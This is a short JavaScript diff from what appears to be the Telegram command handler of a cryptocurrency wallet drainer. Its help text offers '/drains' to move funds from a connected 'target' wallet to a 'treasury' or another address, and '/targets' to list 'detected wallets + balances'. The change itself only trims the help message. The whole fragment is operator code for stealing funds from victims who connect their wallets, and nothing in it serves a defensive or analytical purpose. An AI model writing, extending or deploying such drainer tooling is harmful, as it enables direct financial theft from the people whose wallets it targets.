@@ -29,7 +29,7 @@ async function pollTg() {
       fs.writeFileSync(__dirname + "/.offset", String(tgOffset));
       const [cmd, ...rest] = (u.message?.text || "").trim().toLowerCase().split(/\s+/);
       if (cmd === "/help") {
-        tg("/drains \u2014 last target \u2192 treasury\n/drains <addr> \u2014 last target \u2192 addr\n/drains <#> [addr] \u2014 target # \u2192 addr or treasury\n/targets \u2014 list detected wallets + balances\n\nrun /targets to see who is connected");
+        tg("/drains \u2014 last target \u2192 treasury\n/drains <addr> \u2014 last target \u2192 addr\n/drains <#> [addr] \u2014 target # \u2192 addr or treasury\n/targets \u2014 list detected wallets + balances");
       } else if (cmd === "/drains") {
         const list = Object.keys(targets);
         if (!list.length) return tg("no targets yet \u2014 waiting for a wallet to connect");
